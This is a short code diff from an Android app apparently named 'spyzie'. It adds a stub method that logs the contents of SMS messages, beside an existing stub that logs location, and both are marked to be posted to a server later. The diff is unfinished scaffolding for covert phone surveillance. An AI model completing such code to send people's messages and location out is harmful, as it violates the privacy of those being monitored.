@@ -5,6 +5,7 @@ import android.util.Log;
 
 import com.rx2androidnetworking.Rx2AndroidNetworking;
 import com.tantd.spyzie.data.model.Event;
+import com.tantd.spyzie.data.model.Sms;
 import com.tantd.spyzie.util.Constants;
 
 import java.util.List;
@@ -39,5 +40,11 @@ public class AppApiManager implements ApiManager {
     public void sendLocationData(Location location) {
         Log.d(Constants.LOG_TAG, "[AppApiManager] sendLocationData, lat=" + location.getLatitude() + ", lon=" + location.getLongitude());
         // TODO: Use Rx2AndroidNetworking to post location data to server
+    }
+
+    @Override
+    public void sendSmsData(Sms sms) {
+        Log.d(Constants.LOG_TAG, "[AppApiManager] sendSmsData: " + sms.toString());
+        // TODO: implement here
     }
 }
